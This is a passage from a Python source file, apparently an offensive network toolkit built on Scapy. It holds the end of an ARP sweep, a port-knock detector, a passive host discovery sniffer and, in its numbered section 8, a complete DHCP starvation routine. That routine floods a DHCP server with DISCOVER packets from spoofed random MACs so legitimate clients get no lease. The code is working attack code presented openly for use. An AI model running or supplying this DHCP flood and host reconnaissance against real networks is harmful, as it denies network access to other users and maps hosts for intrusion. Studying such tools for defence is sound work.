                    f"[dim]{pkt[sc.ARP].hwsrc}[/dim]"
                )

    threading.Thread(
        target=sc.sniff,
        kwargs=dict(
            iface=iface, filter="arp", prn=_capture,
            store=False, stop_filter=lambda _: stop.is_set(),
        ),
        daemon=True,
    ).start()

    # batch send in chunks for speed
    pkts = [
        sc.Ether(dst="ff:ff:ff:ff:ff:ff") / sc.ARP(pdst=ip)
        for ip in hosts_ips
    ]
    console.print(f"[yellow][*] Blasting {len(pkts)} ARP requests …[/yellow]")
    sc.sendp(pkts, iface=iface, verbose=False, inter=delay)
    time.sleep(2.5)
    stop.set()

    console.print(Panel(
        f"Requests sent  : [dim]{len(pkts)}[/dim]\n"
        f"Alive hosts    : [bold green]{len(live)}[/bold green]\n"
        f"Duration       : [dim]{_elapsed(start)}[/dim]",
        border_style="green", expand=False,
    ))
    return live


# ═══════════════════════════════════════════════════════════════════
#  8. DHCP STARVATION — exhaust server address pool
# ═══════════════════════════════════════════════════════════════════

def dhcp_starvation(iface: str, count: int = 256, delay: float = 0.1) -> None:
    """
    Flood DHCP server with DISCOVER packets from random spoofed MACs.
    Exhausts the IP pool — legitimate clients get no lease.
    Requires scapy.
    """
    sc = _scapy()

    console.print(Panel(
        f"[bold]Interface[/bold]  [cyan]{iface}[/cyan]\n"
        f"[bold]Requests[/bold]   [yellow]{count}[/yellow]\n"
        f"[bold]Delay[/bold]      [dim]{delay*1000:.0f} ms/req[/dim]\n"
        "[dim]Each DISCOVER uses a unique random MAC.[/dim]",
        title="[bold red]◈  DHCP STARVATION[/bold red]",
        border_style="red", expand=False,
    ))

    sent  = [0]
    start = time.time()

    with Live(refresh_per_second=4, console=console) as live:
        for i in range(count):
            # random MAC per request
            mac_bytes = bytes([random.randint(0x00, 0xFF) for _ in range(6)])
            mac_bytes = bytes([mac_bytes[0] & 0xFE | 0x02]) + mac_bytes[1:]  # locally administered
            mac_str   = ":".join(f"{b:02x}" for b in mac_bytes)
            xid       = random.randint(0, 0xFFFFFFFF)

            pkt = (
                sc.Ether(src=mac_str, dst="ff:ff:ff:ff:ff:ff") /
                sc.IP(src="0.0.0.0", dst="255.255.255.255") /
                sc.UDP(sport=68, dport=67) /
                sc.BOOTP(chaddr=mac_bytes, xid=xid, flags=0x8000) /
                sc.DHCP(options=[("message-type", "discover"), "end"])
            )
            try:
                sc.sendp(pkt, iface=iface, verbose=False)
                sent[0] += 1
            except Exception:
                pass

            live.update(_make_stats_table("DHCP STARVATION", [
                ("Sent",      f"{sent[0]} / {count}"),
                ("Last MAC",  mac_str),
                ("Elapsed",   _elapsed(start)),
            ]))
            time.sleep(delay)

    console.print(Panel(
        f"DHCP DISCOVERs sent : [yellow]{sent[0]}[/yellow]\n"
        f"Duration            : [dim]{_elapsed(start)}[/dim]\n"
        "[dim]Pool likely exhausted — wait for lease TTL to restore.[/dim]",
        title="[bold]DHCP Starvation Complete[/bold]",
        border_style="dim green", expand=False,
    ))


# ═══════════════════════════════════════════════════════════════════
#  9. PORT KNOCK DETECTOR
# ═══════════════════════════════════════════════════════════════════

def port_knock_listen(iface: str, sequence: list[int]) -> None:
    sc = _scapy()

    console.print(Panel(
        f"[bold]Knock sequence[/bold]  [cyan]{' → '.join(str(p) for p in sequence)}[/cyan]\n"
        "[dim]Watching for anyone completing this sequence on the wire.[/dim]",
        title="[bold red]◈  PORT KNOCK DETECTOR[/bold red]",
        border_style="red", expand=False,
    ))

    state: dict[str, list[int]] = {}
    stop  = threading.Event()
    hits  = [0]

    def _handler(pkt):
        if not pkt.haslayer(sc.TCP):
            return
        src      = pkt[sc.IP].src
        dst_port = pkt[sc.TCP].dport
        progress = state.get(src, [])

        if not progress and dst_port == sequence[0]:
            state[src] = [dst_port]
        elif progress and len(progress) < len(sequence):
            expected = sequence[len(progress)]
            if dst_port == expected:
                progress.append(dst_port)
                state[src] = progress
                if len(progress) == len(sequence):
                    hits[0] += 1
                    console.print(
                        f"  [bold red]KNOCK COMPLETE[/bold red]  "
                        f"[green]{src}[/green]  "
                        f"[dim]{' → '.join(str(p) for p in progress)}[/dim]  "
                        f"hit #{hits[0]}"
                    )
                    state[src] = []
            else:
                state.pop(src, None)

    threading.Thread(
        target=sc.sniff,
        kwargs=dict(
            iface=iface, filter="tcp", prn=_handler,
            store=False, stop_filter=lambda _: stop.is_set(),
        ),
        daemon=True,
    ).start()

    console.print("[green][+] Listening. Ctrl-C to stop.[/green]")
    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop.set()
    console.print(f"\n[green][+] Done.  Knock completions detected: {hits[0]}[/green]")


# ═══════════════════════════════════════════════════════════════════
#  10. PASSIVE HOST DISCOVERY
# ═══════════════════════════════════════════════════════════════════

def passive_discover(iface: str, timeout: int = 30) -> list[dict]:
    sc = _scapy()

    console.print(Panel(
        f"[bold]Interface[/bold]  [cyan]{iface}[/cyan]\n"
        f"[bold]Duration[/bold]   [yellow]{timeout}s[/yellow]\n"
        "[dim]ARP · mDNS · DHCP · NDP — sending nothing.[/dim]",
        title="[bold red]◈  PASSIVE DISCOVERY[/bold red]",
        border_style="red", expand=False,
    ))

    seen:  dict[str, dict] = {}
    stop   = threading.Event()

    def _handler(pkt):
        try:
            entry_ip  = None
            entry_mac = None
            hostname  = None
            proto     = None

            if pkt.haslayer(sc.ARP):
                entry_ip  = pkt[sc.ARP].psrc
                entry_mac = pkt[sc.ARP].hwsrc
                proto     = "ARP"

            if pkt.haslayer(sc.UDP) and pkt[sc.UDP].dport == 5353:
                entry_ip = pkt[sc.IP].src if pkt.haslayer(sc.IP) else None
                try:
                    if pkt.haslayer(sc.DNSQR):
                        hostname = pkt[sc.DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
                except Exception:
                    pass
                proto = "mDNS"

            if pkt.haslayer(sc.DHCP):
                opts     = {opt[0]: opt[1] for opt in pkt[sc.DHCP].options if isinstance(opt, tuple)}
                hostname = opts.get("hostname", b"").decode("utf-8", errors="ignore") or None
                entry_mac = pkt[sc.Ether].src if pkt.haslayer(sc.Ether) else None
                proto    = "DHCP"

            if entry_ip and entry_ip not in ("0.0.0.0", "255.255.255.255"):
                if entry_ip not in seen:
                    seen[entry_ip] = {
                        "ip": entry_ip, "mac": entry_mac,
                        "hostname": hostname, "proto": proto,
                    }
                    console.print(
                        f"  [green]+[/green]  [bold]{entry_ip:<16}[/bold]  "
                        f"[dim]{entry_mac or '?':<18}[/dim]  "
                        f"[cyan]{proto:<6}[/cyan]  "
                        f"[yellow]{hostname or ''}[/yellow]"
                    )
                else:
                    if hostname and not seen[entry_ip].get("hostname"):
                        seen[entry_ip]["hostname"] = hostname
        except Exception:
            pass

    threading.Thread(
        target=sc.sniff,
        kwargs=dict(
            iface=iface,
            filter="arp or (udp and (port 5353 or port 67))",
            prn=_handler, store=False,
            timeout=timeout,
            stop_filter=lambda _: stop.is_set(),
        ),
        daemon=True,
    ).start()

    try:
        for _ in range(timeout * 2):
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop.set()

    results = list(seen.values())
    console.print(Panel(
        f"Hosts observed  : [yellow]{len(results)}[/yellow]",
        title="[bold]Passive Discovery Complete[/bold]",
        border_style="green", expand=False,
    ))
    return results
